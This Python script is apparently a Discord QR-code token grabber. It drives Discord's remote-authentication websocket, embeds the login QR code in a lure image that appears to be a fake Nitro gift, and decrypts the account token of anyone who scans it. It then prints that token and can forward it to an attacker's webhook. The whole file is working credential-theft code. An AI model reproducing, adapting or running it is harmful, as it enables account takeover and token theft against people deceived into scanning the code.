import base64
import json
import threading
import time
import os
import qrcode
import websocket
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

from utils.nitroImage import make
import utils.tokenInfo as tokenInfo

import sys


class Messages:
    HEARTBEAT = 'heartbeat'
    HELLO = 'hello'
    INIT = 'init'
    NONCE_PROOF = 'nonce_proof'
    PENDING_REMOTE_INIT = 'pending_remote_init'
    PENDING_FINISH = 'pending_finish'
    FINISH = 'finish'


class DiscordUser:
    def __init__(self, **values):
        self.id = values.get('id')
        self.username = values.get('username')
        self.discrim = values.get('discrim')
        self.avatar_hash = values.get('avatar_hash')
        self.token = values.get('token')

    @classmethod
    def from_payload(cls, payload):
        values = payload.split(':')

        return cls(id=values[0],
                   discrim=values[1],
                   avatar_hash=values[2],
                   username=values[3])

    def pretty_print(self):
        out = ''
        out += f'User:            {self.username}#{self.discrim} ({self.id})\n'
        out += f'Avatar URL:      https://cdn.discordapp.com/avatars/{self.id}/{self.avatar_hash}.png\n'
        out += f'Token (SECRET!): {self.token}\n'
        return out


class DiscordAuthWebsocket:
    def __init__(self, debug=False):
        answer = input('Use a webhook? [Y/n] > ')
        if answer.lower() in ['', 'y', 'yes']:
            self.webhook = True
            self.webhook_url = input(f'Insert your webhook URL >')
        else:
            self.webhook = False
        self.debug = debug
        print("[ * ] running the websocket...")
        self.ws = websocket.WebSocketApp('wss://remote-auth-gateway.discord.gg/?v=1',
                                         on_open=self.on_open,
                                         on_message=self.on_message,
                                         on_error=self.on_error,
                                         on_close=self.on_close)
        print("[ * ] generated the key 2048")
        self.key = RSA.generate(2048)
        print(f"[ * ] generated the cipher key")
        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)
        self.heartbeat_interval = None
        self.last_heartbeat = None
        self.qr_image = None
        self.user = None
        print(f"[ * ] heartbeat_interval = {self.heartbeat_interval}")
        print(f"[ * ] last_heartbeat = {self.last_heartbeat}")
        print(f"[ * ] qr_image = {self.qr_image}")
        print(f"[ * ] user = {self.user}")

    @property
    def public_key(self):
        pub_key = self.key.publickey().export_key().decode('utf-8')
        pub_key = ''.join(pub_key.split('\n')[1:-1])
        return pub_key

    def heartbeat_sender(self):
        while True:
            time.sleep(0.5)  # we don't need perfect accuracy

            current_time = time.time()
            time_passed = current_time - self.last_heartbeat + 1  # add a second to be on the safe side
            if time_passed >= self.heartbeat_interval:
                self.send(Messages.HEARTBEAT)
                self.last_heartbeat = current_time

    def run(self):
        print(f"[ + ] RUNNING")
        self.ws.run_forever()

    def send(self, op, data=None):
        payload = {'op': op}
        if data is not None:
            payload.update(**data)

        if self.debug:
            print(f'Send: {payload}')
        self.ws.send(json.dumps(payload))

    def decrypt_payload(self, encrypted_payload):
        payload = base64.b64decode(encrypted_payload)
        decrypted = self.cipher.decrypt(payload)
        print("[ + ] the payload was decrypted")
        return decrypted

    def generate_qr_code(self, fingerprint):
        img = qrcode.make(f'https://discordapp.com/ra/{fingerprint}')
        print(f"[ * ] generating the qr code...")
        print(f"[ * ] " + f'https://discordapp.com/ra/{fingerprint}')
        self.qr_image = img
        img.save("qrcode.png")
        try:
            output = sys.argv[1]
        except:
            output = "grabber.png"
        make(output=output)
        #try:
        #    os.remove("qrcode.png")
        #except:
        #    pass
        os.system("start grabber.png")
        print(f"QR Grabber Path: {os.getcwd()}\\grabber.png")

    def on_open(self):
        print(f"[ + ] opened")

    def on_message(self, message):
        if self.debug:
            print(f'Recv: {message}')

        data = json.loads(message)
        op = data.get('op')

        if op == Messages.HELLO:
            print('Attempting server handshake...')

            self.heartbeat_interval = data.get('heartbeat_interval') / 1000
            self.last_heartbeat = time.time()

            thread = threading.Thread(target=self.heartbeat_sender)
            thread.daemon = True
            thread.start()

            self.send(Messages.INIT, {'encoded_public_key': self.public_key})

        elif op == Messages.NONCE_PROOF:
            nonce = data.get('encrypted_nonce')
            decrypted_nonce = self.decrypt_payload(nonce)

            proof = SHA256.new(data=decrypted_nonce).digest()
            proof = base64.urlsafe_b64encode(proof)
            proof = proof.decode().rstrip('=')
            self.send(Messages.NONCE_PROOF, {'proof': proof})

        elif op == Messages.PENDING_REMOTE_INIT:
            fingerprint = data.get('fingerprint')
            self.generate_qr_code(fingerprint)

            print('Please scan the QR code to continue.')

        elif op == Messages.PENDING_FINISH:
            encrypted_payload = data.get('encrypted_user_payload')
            payload = self.decrypt_payload(encrypted_payload)

            self.user = DiscordUser.from_payload(payload.decode())

        elif op == Messages.FINISH:
            encrypted_token = data.get('encrypted_token')
            token = self.decrypt_payload(encrypted_token)

            if self.qr_image is not None:
                self.qr_image.close()

            self.user.token = token.decode()
            if self.webhook:
                tokenInfo.main([self.user.token], self.webhook_url)
            print(self.user.pretty_print())

            self.ws.close()

    def on_error(self, error):
        print(error)

    def on_close(self):
        print('----------------------')
        print('Connection closed.')


if __name__ == '__main__':
    try:
        os.remove("grabber.png")
    except:
        pass
    auth_ws = DiscordAuthWebsocket(debug=False)
    auth_ws.run()
    input("press enter to exit.")
    try:
        os.remove("grabber.png")
    except:
        pass
    exit()